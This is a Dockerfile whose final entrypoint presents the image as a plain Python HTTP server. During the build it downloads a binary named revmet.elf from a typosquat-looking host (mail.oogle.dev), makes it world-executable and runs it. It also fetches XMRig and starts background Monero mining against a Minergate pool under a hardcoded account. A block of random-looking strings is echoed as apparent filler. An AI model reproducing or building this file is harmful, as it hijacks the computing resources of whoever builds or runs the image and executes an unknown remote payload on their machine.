FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo JzEQ8TcrxOF9KcsLNqyERTfSrRtJ8KzN kYU3sxIlEKe0TKlrJbzNGkBkZrRTTSIY uT4gqGW242YhY4QKjcegWICdMCB5KKAW 2JaIrsbTmeSCige7Q5YraSLMo22lFl7d 4Agi86Xrihtp7E4dsqxMB0LfvhL4MFvu qoyFhBDtoeZjGbk4h4M7HEFLRkrHfNc4 glyZNIwAShZOYdZsMbgtV5Jz3rAF4xYR hAxw8efspItBQ9OePrUcJ6fAgHfg3QiR PPY2qTbDt4YCYgIZVNgz15tEG8RVky9O BCuKmgSrEtTpnS3OhkhIdhzWj8zWGxb9 sSLHNPqqXXAIibEVpCeybzdYQGSsQeU9 p8w2DXra3kTXzQSq1cTj0T1Ee2prDpjp mQoJUWMtSsZse8HbjsEwNOiKHbP72KaQ 2u05EeyFP9JfZK7gVHOpRQFU8akrpsBN DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]